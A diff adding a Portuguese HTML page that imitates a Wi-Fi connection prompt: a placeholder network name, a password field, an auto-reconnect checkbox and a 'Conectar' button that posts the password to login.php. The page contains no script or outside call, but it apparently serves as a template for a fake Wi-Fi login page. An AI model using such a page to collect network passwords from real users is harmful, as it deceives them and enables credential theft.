@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html class="no-js" lang="bt-BR">
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" href="./reset.css" />
+    <link rel="stylesheet" href="./style.css" />
+    <title>Login</title>
+  </head>
+
+  <body>
+    <div class="wrapper fadeInDown">
+      <h1>NOME DA REDE</h1>
+      <div class="fundoBranco">
+        <!-- Icon -->
+        <div class="fadeIn first">
+          <h2 class="titulo_senha">Senha</h2>
+        </div>
+
+        <!-- Login Form -->
+        <form action="login.php" method="POST">
+          <input
+            type="password"
+            id="password"
+            class="password"
+            name="password"
+            placeholder="Insira a senha"
+          />
+
+          <div class="container_checkbox_reconexao">
+            <p class="reconexao">Reconexão automática</p>
+            <input class="checkbox" type="checkbox" />
+          </div>
+
+          <div class="conectar_Container">
+            <p class="ver_mais">&#8964; Ver mais</p>
+            <input type="submit" class="conectar" value="Conectar" />
+          </div>
+        </form>
+      </div>
+    </div>
+  </body>
+</html>
